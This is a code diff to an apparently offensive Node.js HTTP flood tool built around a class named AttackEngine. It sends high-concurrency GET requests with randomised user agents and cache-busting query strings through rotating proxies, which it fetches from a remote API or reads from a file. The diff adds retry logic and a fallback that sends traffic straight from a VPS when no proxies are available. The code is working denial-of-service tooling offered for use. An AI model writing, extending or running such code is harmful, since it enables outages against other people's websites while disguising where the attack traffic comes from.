@@ -10,17 +10,6 @@ const HttpProxyAgent = require('http-proxy-agent');
 const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540);
 const REQUEST_TIMEOUT = 8000;
 
-// Fetch proxies from your custom API
-async function getProxies() {
-    try {
-        const response = await axios.get('https://optrpms2.onrender.com/v2/');
-        return response.data.proxies || [];
-    } catch (error) {
-        console.error('Error fetching proxies:', error);
-        return [];
-    }
-}
-
 function loadLines(filename) {
     try {
         return fs.readFileSync(filename, 'utf8')
@@ -37,6 +26,36 @@ const USER_AGENTS = loadLines('ua.txt');
 
 const UA_POOL = Array.from({ length: 10000 }, () =>
     USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
+
+async function getProxiesFromAPI(retries = 3) {
+    for (let i = 0; i < retries; i++) {
+        try {
+            const res = await axios.get('https://optrpms2.onrender.com/v2/', { timeout: 5000 });
+            if (res.data && Array.isArray(res.data.proxies) && res.data.proxies.length > 0) {
+                console.log(`Loaded ${res.data.proxies.length} proxies from API.`);
+                return res.data.proxies;
+            }
+        } catch (err) {
+            console.warn(`Proxy API fetch failed (try ${i + 1}): ${err.message}`);
+        }
+        await new Promise(r => setTimeout(r, 2000));
+    }
+    return null;
+}
+
+function loadProxiesFromFile(file = 'proxies.txt') {
+    try {
+        const raw = fs.readFileSync(file, 'utf8')
+            .split('\n')
+            .map(l => l.trim())
+            .filter(Boolean);
+        console.log(`Loaded ${raw.length} proxies from proxies.txt.`);
+        return raw;
+    } catch (err) {
+        console.warn('Failed to load proxies.txt:', err.message);
+        return [];
+    }
+}
 
 class AttackEngine {
     constructor(target, duration) {
@@ -55,16 +74,23 @@ class AttackEngine {
     }
 
     async loadProxies() {
-        this.proxies = await getProxies();
-        if (!this.proxies.length) {
-            console.error('No proxies loaded. Bailing out.');
-            process.exit(1);
+        const apiProxies = await getProxiesFromAPI();
+        if (apiProxies && apiProxies.length) {
+            this.proxies = apiProxies;
+        } else {
+            const fileProxies = loadProxiesFromFile();
+            if (fileProxies.length) {
+                this.proxies = fileProxies;
+            } else {
+                console.warn('No proxies available. Using VPS IP directly.');
+                this.proxies = []; // This lets it fallback to raw VPS mode
+            }
         }
     }
 
     getRandomProxy() {
+        if (!this.proxies.length) return null;
         const proxy = this.proxies[Math.floor(Math.random() * this.proxies.length)];
-        if (!proxy) return null;
         const [host, port] = proxy.split(':');
         return { host, port: parseInt(port) };
     }
@@ -96,25 +122,25 @@ class AttackEngine {
 
         const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
         const proxy = this.getRandomProxy();
+        const isHttps = this.target.startsWith('https');
+        let options = {
+            headers,
+            timeout: REQUEST_TIMEOUT,
+            validateStatus: null
+        };
 
-        if (!proxy) {
-            this.stats.errors++;
-            return;
+        if (proxy) {
+            const proxyUrl = `http://${proxy.host}:${proxy.port}`;
+            const agent = isHttps ? new HttpsProxyAgent(proxyUrl) : new HttpProxyAgent(proxyUrl);
+            options.httpsAgent = isHttps ? agent : undefined;
+            options.httpAgent = !isHttps ? agent : undefined;
+        } else {
+            options.httpsAgent = new https.Agent({ keepAlive: true });
+            options.httpAgent = new http.Agent({ keepAlive: true });
         }
 
-        const isHttps = this.target.startsWith('https');
-        const proxyUrl = `http://${proxy.host}:${proxy.port}`;
-        const agent = isHttps ? new HttpsProxyAgent(proxyUrl) : new HttpProxyAgent(proxyUrl);
-
         try {
-            const response = await axios.get(urlWithNoise, {
-                headers,
-                timeout: REQUEST_TIMEOUT,
-                httpAgent: !isHttps ? agent : undefined,
-                httpsAgent: isHttps ? agent : undefined,
-                validateStatus: null
-            });
-
+            const response = await axios.get(urlWithNoise, options);
             if (response.status === 200) {
                 this.stats.success++;
                 return;
